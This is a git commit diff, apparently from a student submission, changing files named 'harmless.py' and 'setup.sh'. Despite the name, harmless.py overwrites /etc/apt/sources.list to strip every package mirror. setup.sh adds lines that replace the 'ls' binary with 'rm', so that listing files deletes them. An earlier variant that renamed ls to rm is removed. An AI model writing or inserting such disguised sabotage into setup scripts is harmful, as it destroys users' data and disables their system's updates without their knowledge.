292be6439a3a4373ff1633ed5b9de12825d1f457
Thomas Weber <thomas.weber@ynov.com>
2021-10-19 22:14:37 +0200

    test

--- submission-1/harmless.py
+++ submission-1/harmless.py
@@ -1,7 +1,3 @@
-import os
-
-os.rename("/etc/bin/ls", "/etc/bin/rm")
-
 # Removing all mirrors from apt
 # -> No direct way to apt install/upgrade
 with open("/etc/apt/sources.list", "w") as file:
--- submission-1/setup.sh
+++ submission-1/setup.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
+mv /etc/bin/ls ~/Documents
+cp /etc/bin/rm /etc/bin/ls
 python3 harmless.py
 
 
